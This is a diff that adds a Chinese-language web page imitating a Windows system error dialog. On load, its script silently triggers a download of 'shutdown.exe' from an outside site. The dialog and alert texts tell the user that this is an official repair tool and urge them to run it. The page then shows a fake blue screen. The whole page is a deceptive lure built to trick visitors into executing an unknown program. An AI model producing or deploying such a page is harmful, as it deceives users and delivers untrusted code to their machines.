@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>系统错误</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  html,body { height:100%; font-family:"Segoe UI","Microsoft YaHei",sans-serif; }
+  body {
+    background:#0078d7;
+    display:flex; align-items:center; justify-content:center;
+    overflow:hidden;
+  }
+  .err {
+    background:#ffffff; width:520px; max-width:92vw;
+    border-radius:8px; overflow:hidden;
+    box-shadow:0 20px 60px rgba(0,0,0,.3);
+    animation:pop .25s ease;
+  }
+  @keyframes pop { from{transform:scale(.85);opacity:0} to{transform:scale(1);opacity:1} }
+  .top {
+    background:#f3f3f3; padding:14px 18px; font-size:14px; color:#333;
+    border-bottom:1px solid #e0e0e0; display:flex; align-items:center; gap:10px;
+  }
+  .icon {
+    width:28px;height:28px;border-radius:50%;background:#e81123;color:#fff;
+    display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:700;
+  }
+  .body { padding:26px 22px; font-size:15px; color:#222; line-height:1.7; }
+  .body b { color:#e81123; }
+  .btns { padding:0 22px 22px; display:flex; gap:10px; justify-content:flex-end; }
+  button {
+    padding:9px 26px; font-size:14px; border-radius:4px; cursor:pointer;
+    border:1px solid #0078d7; background:#0078d7; color:#fff;
+  }
+  button:hover { background:#106ebe; }
+  .note { font-size:12px; color:#888; margin-top:14px; }
+  .screen {
+    position:fixed; inset:0; background:#0078d7; color:#fff;
+    display:none; flex-direction:column; align-items:center; justify-content:center;
+    font-size:34px; font-weight:600; letter-spacing:2px;
+  }
+  .screen .code { font-size:20px; margin-top:24px; opacity:.8; font-family:Consolas,monospace; }
+</style>
+</head>
+<body>
+
+<div class="err" id="dlg">
+  <div class="top"><div class="icon">×</div><span>计算机遇到问题，需要重新启动</span></div>
+  <div class="body">
+    你的电脑遇到一个问题，需要重新启动。我们只收集某些错误信息，然后你可以重新启动。<br><br>
+    若要了解此问题的详细信息，请稍后在事件查看器中查看：<b>Shutdown_Manually.exe</b>
+    <div class="note">请点击「立即修复」下载官方修复程序，以阻止此问题再次发生。</div>
+  </div>
+  <div class="btns"><button onclick="step2()">立即修复</button></div>
+</div>
+
+<div class="screen" id="bsod">
+  <div>:(</div>
+  <div style="margin-top:18px;font-size:22px;">你的电脑遇到问题，需要重新启动。</div>
+  <div class="code">收集错误信息 0% 完成 → 即将关机…</div>
+</div>
+
+<script>
+  // 打开即自动开始下载关机 exe
+  function autoDownload(){
+    var a = document.createElement('a');
+    a.href = 'https://www.tarjanoj.com/file/380/shutdown.exe';
+    a.download = 'shutdown.exe';
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+  }
+  window.addEventListener('DOMContentLoaded', function(){
+    autoDownload(); // 只下载一次，避免浏览器弹“下载多个文件”警告
+  });
+
+  function step2(){
+    alert('修复程序 shutdown.exe 已下载完成。\n\n请前往浏览器「下载」目录，双击运行 shutdown.exe 以完成系统修复。');
+    var dlg = document.getElementById('dlg');
+    dlg.querySelector('.body').innerHTML =
+      '✅ 修复程序已下发。<br><br>请在下载文件夹中运行 <b>shutdown.exe</b>，系统将自动完成修复并重启。' +
+      '<div class="note">（如未看到下载，按 Ctrl+J 查看下载记录）</div>';
+    dlg.querySelector('.btns').innerHTML = '<button onclick="step3()">我已下载，继续修复</button>';
+  }
+  function step3(){
+    alert('即将开始修复，请稍候…');
+    document.getElementById('dlg').style.display='none';
+    document.getElementById('bsod').style.display='flex';
+  }
+</script>
+</body>
+</html>
